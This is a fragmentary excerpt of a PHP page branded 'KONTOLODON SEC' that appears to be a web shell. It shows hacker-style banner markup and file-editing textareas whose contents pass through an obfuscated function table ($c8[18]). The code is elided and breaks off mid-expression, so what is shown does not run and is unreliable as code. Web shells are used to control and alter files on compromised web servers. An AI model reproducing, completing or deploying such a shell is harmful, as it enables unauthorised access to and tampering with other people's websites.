...
<meta property="og:title" content="KONTOLODON SEC" />
<meta property="og:description" content="" />
<meta name="theme-color" content="red">
<meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no">
<title>KONTOLODON SEC</title>
...
<div class="table-responsive text-light" style="text-align: left;padding: 4px;border: 2px solid red;border-radius:5px;">
    <div style="text-align: center;display: flex;align-items: center;justify-content: center;align-content: center;">
        <a href="?" style="font-size: 2rem;font-family: Merienda;padding-left: 0.3rem;padding-right: 0.3rem;"><span class="kedip">KONTOLODON SEC 💦</span></a>
    </div>
        ...
        <li>Made By : <span class="kedip">Mr. Kontolodon</span></li>
...
<form method="post">
<div class="form-group">
<textarea name="ctn" id="ctn" cols="90" rows="9" class="form-control border"><?= $c8[18](
...
<div class="form-group">
<textarea name="ctn" id="ctn" cols="90" rows="9" class="form-control border" readonly><?= $c8[18](
